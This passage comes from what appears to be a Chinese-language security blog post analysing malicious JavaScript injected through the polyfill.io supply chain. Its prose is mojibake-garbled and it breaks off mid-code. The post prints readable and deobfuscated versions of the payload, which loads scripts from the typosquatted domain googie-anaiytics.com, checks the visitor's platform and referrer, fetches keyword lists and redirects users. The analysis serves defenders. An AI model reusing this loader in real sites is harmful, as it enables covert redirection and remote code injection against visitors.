class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">klodTq</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠä¸Šé¢ç›´æ¥ä¸Ÿåˆ° ChatGPT è¦ä»–å¹«ä½ è½‰æˆå¯è®€æ€§ä½³çš„ç¨‹å¼ç¢¼ï¼Œå°±æœƒå¾—åˆ°åº•ä¸‹çš„çµæœï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Function to decode a UTF-8 string</span><span class="token keyword">function</span> <span class="token function">decodeUtf8</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>      i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">191</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">224</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      c2 <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      c2 <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      c3 <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c3 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      i <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> output<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to decode a Base64 string</span><span class="token keyword">function</span> <span class="token function">decodeBase64</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> base64Chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^A-Za-z0-9+/=]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">=</span> base64Chars<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    o <span class="token operator">=</span> base64Chars<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    u <span class="token operator">=</span> base64Chars<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> base64Chars<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>o <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>o <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>u <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> iChar <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> a<span class="token punctuation">;</span>    output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      output <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>iChar<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">decodeUtf8</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to load a JavaScript file dynamically</span><span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">encodedUrl<span class="token punctuation">,</span> randomString<span class="token punctuation">,</span> window<span class="token punctuation">,</span> document<span class="token punctuation">,</span> randomString2<span class="token punctuation">,</span> separator</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> decode <span class="token operator">=</span> decodeBase64<span class="token punctuation">;</span>    <span class="token keyword">const</span> decodedUrl <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>encodedUrl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>separator <span class="token operator">+</span> separator<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> separator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> scriptId <span class="token operator">=</span> randomString<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span> randomString2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> randomString2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> scriptElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>scriptId <span class="token operator">+</span> separator<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> separator<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token function-variable function">noop</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    scriptElement<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/javascript"</span><span class="token punctuation">;</span>    scriptElement<span class="token punctuation">.</span>onload <span class="token operator">=</span> noop<span class="token punctuation">;</span>    scriptElement<span class="token punctuation">.</span>src <span class="token operator">=</span> decodedUrl<span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptElement<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>    <span class="token string">"aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM="</span><span class="token punctuation">,</span>    <span class="token string">"gUssQxWzjLAD"</span><span class="token punctuation">,</span>    window<span class="token punctuation">,</span>    document<span class="token punctuation">,</span>    <span class="token string">"DrPdgDiahyku"</span><span class="token punctuation">,</span>    <span class="token string">"ptsrhUDHCv"</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Automatically execute the script loading function if the platform is not Mac or Win and the referrer is valid</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^Mac|Win</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>referrer<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ Mac è·Ÿ Windows ä¸Šï¼Œè€Œä¸”æœ‰å¸¶ referrer çš„ç¶²é æ‰æœƒè§¸ç™¼ï¼Œæœƒå»è¼‰å…¥ä¸€å€‹ scriptï¼Œè€Œ script çš„ src æ˜¯ <code>aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=</code> base64 è§£ç¢¼ä¹‹å¾Œçš„çµæœï¼š</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.googie-anaiytics.com&#x2F;gtags.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹çœ‹ä¹‹ä¸‹æœƒæƒ³èªªï¼šã€Œé€™ä¸å°±æ˜¯ Google Analytics å—ï¼Ÿæœ‰ä»€éº¼ç‰¹åˆ¥ï¼Ÿã€ï¼Œä½†æ›´ä»”ç´°çœ‹ï¼Œæœƒçœ‹åˆ° <code>googie</code> è·Ÿ <code>anaiytics</code> é€™äº›å½è£çš„å–®å­—ï¼Œé¡¯ç„¶æ˜¯å€‹æƒ¡æ„ domainã€‚</p><p>è€Œé€™å€‹æª”æ¡ˆè£¡çš„ç¨‹å¼ç¢¼ç†æ‰€ç•¶ç„¶ç¶“éäº†æ··æ·†ï¼š</p><p><img src="/img/stop-using-polyfill-io/p4.png" alt="æƒ¡æ„ JavaScript å…§å®¹"></p><p>ä½†å› ç‚ºä¸å¤ªç”¨å¿ƒï¼Œæ˜¯æ‰¾ç¾æˆå·¥å…·åšçš„ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç”¨å…¶ä»–ç¾æˆå·¥å…·ä¾†é‚„åŸï¼š</p><ol><li><a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a></li><li><a href="https://deobfuscate.relative.im/">https://deobfuscate.relative.im/</a></li></ol><p>å¯ä»¥é‚„åŸæˆåº•ä¸‹å¯è®€æ€§å¥½äº†ä¸å°‘çš„å½¢å¼ï¼Œè‡³å°‘æœ‰äº›å­—ä¸²å¯ä»¥çœ‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">loadJS</span><span class="token punctuation">(</span><span class="token parameter">_0x1fa6fb<span class="token punctuation">,</span> _0x1802b4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> _0x70d7c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _0x505482 <span class="token operator">=</span> _0x1802b4 <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  _0x70d7c<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text/javascript'</span>  <span class="token punctuation">&#123;</span>    _0x70d7c<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">_0x505482</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  _0x70d7c<span class="token punctuation">.</span>src <span class="token operator">=</span> _0x1fa6fb  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>_0x70d7c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">isPc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> _0x4ed75f <span class="token operator">=</span>        navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'Win32'</span> <span class="token operator">||</span> navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'Windows'</span><span class="token punctuation">,</span>      _0x3f80bf <span class="token operator">=</span>        navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'Mac68K'</span> <span class="token operator">||</span>        navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'MacPPC'</span> <span class="token operator">||</span>        navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'Macintosh'</span> <span class="token operator">||</span>        navigator<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">'MacIntel'</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x3f80bf <span class="token operator">||</span> _0x4ed75f<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x1793fe<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">checkKeywords</span><span class="token punctuation">(</span><span class="token parameter">_0x3ab08e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> _0x18dd4d <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>innerHTML  <span class="token keyword">let</span> _0x3cdba9 <span class="token operator">=</span> <span class="token boolean">false</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> _0xda2c7 <span class="token keyword">of</span> _0x3ab08e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x18dd4d<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>_0xda2c7<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      _0x3cdba9 <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token keyword">const</span> _0xd85bed <span class="token operator">=</span> _0x18dd4d<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>_0xda2c7<span class="token punctuation">)</span><span class="token punctuation">,</span>        _0x267743 <span class="token operator">=</span> _0x18dd4d<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>_0xd85bed <span class="token operator">-</span> <span class="token number">20</span><span class="token punctuation">,</span> _0xd85bed <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> _0x3cdba9<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">vfed_update</span><span class="token punctuation">(</span><span class="token parameter">_0x2723e2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://www.googie-anaiytics.com/keywords/vn-keyword.json'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_0x1204ac</span><span class="token punctuation">)</span> <span class="token operator">=></span> _0x1204ac<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_0x318df9</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> _0x3d6056 <span class="token operator">=</span> <span class="token function">checkKeywords</span><span class="token punctuation">(</span>_0x318df9<span class="token punctuation">)</span>      _0x3d6056 <span class="token operator">&amp;&amp;</span>        _0x2723e2 <span class="token operator">!==</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span>          <span class="token function">loadJS</span><span class="token punctuation">(</span>            <span class="token string">'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn'</span><span class="token punctuation">,</span>            <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>usercache <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> _0x2723e2              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_0x2c91ce</span><span class="token punctuation">)</span> <span class="token operator">=></span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error fetching the JSON file:'</span><span class="token punctuation">,</span> _0x2c91ce<span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">check_tiaozhuan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> _0x464cf7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> _0x2ddab7 <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x15452<span class="token punctuation">,</span> _0x3e7ea8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> _0x2faa6e <span class="token operator">=</span> <span class="token punctuation">&#123;</span>          <span class="token function-variable function">bjeMJ</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x15a8ac<span class="token punctuation">,</span> _0xefecf2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">_0x15a8ac</span><span class="token punctuation">(</span>_0xefecf2<span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token function-variable function">pqiqW</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x50e73a<span class="token punctuation">,</span> _0x158536</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> _0x50e73a <span class="token operator">!==</span> _0x158536          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token function-variable function">zbtQp</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1dfdda<span class="token punctuation">,</span> _0x1aa046<span class="token punctuation">,</span> _0x3b4d3c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">_0x1dfdda</span><span class="token punctuation">(</span>_0x1aa046<span class="token punctuation">,</span> _0x3b4d3c<span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token literal-property property">volhE</span><span class="token operator">:</span>            <span class="token string">'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn'</span><span class="token punctuation">,</span>          <span class="token function-variable function">OBmcC</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x598542<span class="token punctuation">,</span> _0x5a0037</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> _0x598542 <span class="token operator">==</span> _0x5a0037          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token function-variable function">IzGuE</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x193bad<span class="token punctuation">,</span> _0x38f83f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> _0x193bad <span class="token operator">&lt;=</span> _0x38f83f          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token function-variable function">MctlV</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x4cf969<span class="token punctuation">,</span> _0x3f5292</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> _0x4cf969 <span class="token operator">===</span> _0x3f5292          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token literal-property property">NiqyK</span><span class="token operator">:</span> <span class="token string">'mcNrr'</span><span class="token punctuation">,</span>          <span class="token literal-property property">HANcJ</span><span class="token operator">:</span> <span class="token string">'QRUUg'</span><span class="token punctuation">,</span>          <span class="token function-variable function">pgwSI</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x26a5c9<span class="token punctuation">,</span> _0x345245</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> _0x26a5c9 <span class="token operator">!==</span> _0x345245          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token literal-property property">XaDFm</span><span class="token operator">:</span> <span class="token string">'iuHAU'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> _0x1c444b <span class="token operator">=</span> _0x2ddab7          <span class="token operator">?</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x2faa6e<span class="token punctuation">.</span><span class="token function">MctlV</span><span class="token punctuation">(</span>_0x2faa6e<span class="token punctuation">.</span>NiqyK<span class="token punctuation">,</span> _0x2faa6e<span class="token punctuation">.</span>HANcJ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> _0x180d73 <span class="token operator">=</span> _0x2faa6e<span class="token punctuation">.</span><span class="token function">bjeMJ</span><span class="token punctuation">(</span>_0x3eaf18<span class="token punctuation">,</span> _0x2bb07f<span class="token punctuation">)</span>                _0x180d73 <span class="token 